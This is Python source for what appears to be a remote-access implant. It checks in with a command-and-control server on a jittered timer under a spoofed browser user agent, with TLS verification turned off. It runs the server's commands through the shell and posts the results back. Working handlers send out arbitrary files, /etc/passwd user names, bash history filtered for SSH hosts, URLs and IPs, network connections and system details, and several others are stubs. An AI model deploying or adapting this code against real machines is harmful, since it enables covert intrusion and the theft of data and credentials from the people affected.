import time
import requests
import json
import subprocess
import random
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
C2_SERVER_URL = "http://0.0.0.0:8080"
CHECK_IN_ENDPOINT = "/check-in"
RESULTS_ENDPOINT = "/send-results"
SLEEP_INTERVAL = 30  # Time to wait between beacons (in seconds)
TIMEOUT = 600  # Timeout for the server's response (in seconds)
AUTH_TOKEN = "Bearer YOUR_SECRET_KEY"  # Replace with your authorization token
HEADERS = {
    "Authorization": AUTH_TOKEN,
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
}

def send_output(endpoint:str,data):
    try:
        requests.post(C2_SERVER_URL+endpoint,verify=False,headers=HEADERS,data=data)
    except Exception as e:
        pass
def check_in():
    """Send a Check-In GET request to the server."""
    try:
        print("[*] Sending Check-In request...")
        response = requests.get(C2_SERVER_URL+CHECK_IN_ENDPOINT, verify=False, headers=HEADERS, timeout=TIMEOUT)
        response.raise_for_status()  # Raise an exception for error HTTP statuses
        print("[*] Check-In successful")
        return response.json()

    except requests.exceptions.Timeout:
        print("[!] Check-In request timed out.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during Check-In: {e}")
    return []

def handle_exit(command):
    print("Exiting the program...")

def handle_pwd(command):
    pwd = subprocess.run("pwd",shell=True,text=True,capture_output=True)
    data = pwd.stdout.encode()
    send_output(endpoint="/path",data=data)

def handle_cat(command):
    cat_file = subprocess.run(command,shell=True,text=True,capture_output=True)
    if cat_file.returncode != 0:
        data = f"Error: {cat_file.stderr}".encode()
    else:
        data = cat_file.stdout.encode()
    send_output(endpoint="/catfile",data=data)

def handle_listdir(command):
    list_dir = subprocess.run("ls",shell=True,text=True,capture_output=True)
    data = list_dir.stdout.encode()
    send_output(endpoint="/listdir",data=data)

def handle_whoami(command):
    wdata = subprocess.run("whoami",shell=True,text=True,capture_output=True)
    data = wdata.stdout.encode()
    send_output(endpoint="/whoami",data=data)

def handle_connections(command):
    connections = subprocess.run("ss -tuln",shell=True,text=True,capture_output=True)
    data = connections.stdout.encode()
    send_output(endpoint="/connections",data=data)

def handle_cd(command):
    print("Handling cd command...")

def handle_addresses(command):
    addresses = subprocess.run("ip addr",shell=True,text=True,capture_output=True)
    data = addresses.stdout.encode()
    send_output(endpoint="/addresses",data=data)

def handle_listusers(command):
    listusers = subprocess.run("cut -d: -f1 /etc/passwd",shell=True,text=True,capture_output=True)
    data = listusers.stdout.encode()
    send_output(endpoint="/listusers",data=data)

def handle_userhist(command):
    command = "grep -E 'ssh|http|https|@|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' ~/.bash_history"
    userhist = subprocess.run(command,shell=True,text=True,capture_output=True)
    data = userhist.stdout.encode()
    send_output(endpoint="/userhist",data=data)

def handle_screenshot(command):
    print("Handling screenshot command...")

def handle_checksecurity(command):
    print("Handling download command...")

def handle_download(command):
    """Process the download command by reading a file and sending it to the server."""
    try:
        filename = command.split(" ")[1] if len(command.split(" ")) > 1 else None
        if not filename:
            data = b"Error: No filename provided"
        
        if not os.path.exists(filename):
            data = b"Error: File not found"

        with open(filename,"rb") as file:
            data = file.read()
        
    except Exception as e:
        pass
        # data = f"Error: {str(e)}".encode()

    send_output(endpoint="/download",data=data)

def handle_persist(command):
    print("Handling persist command...")

def handle_unpersist(command):
    print("Handling unpersist command...")

def handle_prompt(command):
    print("Handling prompt command...")

def handle_systeminfo(command):
    sys_info = subprocess.run("uname -a",shell=True,text=True,capture_output=True)
    cpu_info = subprocess.run("lscpu",shell=True,text=True,capture_output=True)
    memory_info = subprocess.run("free -h",shell=True,text=True,capture_output=True)
    disk_info = subprocess.run("df -a",shell=True,text=True,capture_output=True)
    net_info = subprocess.run("ip a",shell=True,text=True,capture_output=True)
    gpu_info = subprocess.run("lspci",shell=True,text=True,capture_output=True)
    data = f"\033[35mSystem info:\033[0m \n{sys_info} \n\033[35mCPU Info:\033[0m \n{cpu_info} \n\033[35mMemory Info:\033[0m \n{memory_info} \n\033[35mDisk Info:\033[0m \n{disk_info} \n\033[35mNetwork Info:\033[0m \n{net_info} \n\033[35mGPU Info:\033[0m \n{gpu_info}".encode()
    send_output(endpoint='/sysinfo',data=data)

def handle_clipboard():
    print("Handling clipboard command...")

def handle_shell():
    print("Handling shell command...")

def handle_sleep():
    print("Handling sleep command...")

# Create a switch-like dictionary
commands_switch = {
    "exit": handle_exit,
    "pwd": handle_pwd,
    "cat": handle_cat,
    "listdir": handle_listdir,
    "whoami": handle_whoami,
    "connections": handle_connections,
    "cd": handle_cd,
    "addresses": handle_addresses,
    "listusers": handle_listusers,
    "userhist": handle_userhist,
    "screenshot": handle_screenshot,
    "download": handle_download,
    "checksecurity": handle_checksecurity,
    "persist": handle_persist,
    "unpersist": handle_unpersist,
    "prompt": handle_prompt,
    "systeminfo": handle_systeminfo,
    "clipboard": handle_clipboard,
    "shell ": handle_shell,
    "sleep ": handle_sleep,
}

def handle_command(command):
    # Get the corresponding function for the command
    action = commands_switch.get(command.split(" ")[0], None)

    if action:
        action(command)  # Execute the command's function
    else:
        pass



def main():
    while True:
        commands = check_in()
        if commands:
            for command in commands:
                print(f"Executing command {command}")
                output = handle_command(command)

        time.sleep(random.randint(SLEEP_INTERVAL - 5, SLEEP_INTERVAL + 5))  # Add jitter to sleep times

if __name__ == "__main__":
    main()